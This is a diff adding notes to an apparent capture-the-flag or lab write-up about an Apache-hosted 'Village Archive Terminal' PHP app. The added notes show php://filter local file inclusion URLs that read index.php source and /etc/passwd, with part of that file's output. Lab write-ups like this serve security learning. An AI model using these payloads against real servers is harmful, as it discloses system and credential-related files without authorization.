@@ -152,7 +152,7 @@ PORT   STATE SERVICE VERSION
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
 
-
+The php filter can be bypassed and one way is "http://10.64.130.163/?doc=php://filter/read=pdf/resource=index.php" to view the underlying code, from here I realised its likely easier to use burke suite and alter this to access anyfile or directory filtered out. Either way it supports initial thoughts of filtering files and directory traversal attempts.
 ```
 <?php
 $doc = isset($_GET['doc']) ? $_GET['doc'] : '';
@@ -194,4 +194,17 @@ if ($doc !== '') {
 <meta charset="UTF-8">
 <title>VILLAGE ARCHIVE TERMINAL v2.3</title>
 ...
+```
+Similarly its easy progression to see that altering that command its possible to obtain the passwd file with 
+```
+http://10.64.130.163/?doc=php://filter/read=pdf/resource=/etc/passwd
+```
+This gave the usual passwd file but the one of most interest was ubuntu:x:1000:1000:/home/ubuntu:/bin/bash
+```
+root:x:0:0:root:/root:/bin/bash
+...
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+...
+
+
 ```
